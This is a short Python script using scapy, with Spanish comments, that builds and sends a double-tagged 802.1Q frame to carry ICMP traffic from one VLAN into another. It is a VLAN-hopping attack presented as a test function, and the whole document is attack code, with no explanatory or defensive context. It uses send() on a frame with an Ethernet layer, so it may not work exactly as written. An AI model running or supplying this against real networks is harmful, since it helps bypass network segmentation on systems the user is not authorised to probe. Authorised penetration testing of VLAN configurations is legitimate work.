from scapy.all import Ether, Dot1Q, IP, ICMP, send

def test_vlan_hopping(target_ip, vlan_actual, vlan_destino):
    # Construcción de paquete con doble etiqueta 802.1Q
    packet = Ether()/Dot1Q(vlan=vlan_actual)/Dot1Q(vlan=vlan_destino)/IP(dst=target_ip)/ICMP()
    send(packet)
    print(f"[*] Paquete de salto de VLAN enviado de {vlan_actual} a {vlan_destino}")
